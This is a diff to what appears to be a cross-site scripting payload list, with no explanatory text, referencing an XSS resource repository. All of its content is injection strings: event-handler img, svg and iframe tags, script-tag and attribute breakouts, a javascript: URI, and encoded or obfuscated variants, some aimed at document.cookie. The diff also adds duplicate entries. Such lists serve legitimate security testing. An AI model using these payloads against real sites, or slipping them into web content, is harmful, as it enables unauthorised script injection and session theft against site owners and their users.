@@ -6,14 +6,20 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 "><img src=1 onerror=alert("XSS")>
 "><img src=x onerror=alert(document.cookie)>
 <img src=x onerror=alert(document.cookie)>
-`<img/src/onerror=prompt(document.domain)>`
+<img/src/onerror=prompt(document.domain)>
 <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+[{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]
+<img/src/onerror=prompt(document.domain)>
+admin";alert(1);//                                                        --> Imp
+xss" onmouseover="alert(1)                                                --> Imp
+"><svg onload=alert(1)>                                                   --> Imp
+javascript:alert(document.cookie)                                        --> Imp
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
 "`'><script>\x3Bjavascript:alert(1)</script>
 </TITLE><SCRIPT>alert(document.domain);</SCRIPT> 
 <<SCRIPT>alert("XSS");//\<</SCRIPT>
-`[{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]`
+[{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]
 </title><scRipt>alert(0x00C57D)</scRipt>
 <iMg src%3dN onerror%3dalert(0x0036A9)>
 <iMg src%3dN onerror%3dalert(0x000D98)>
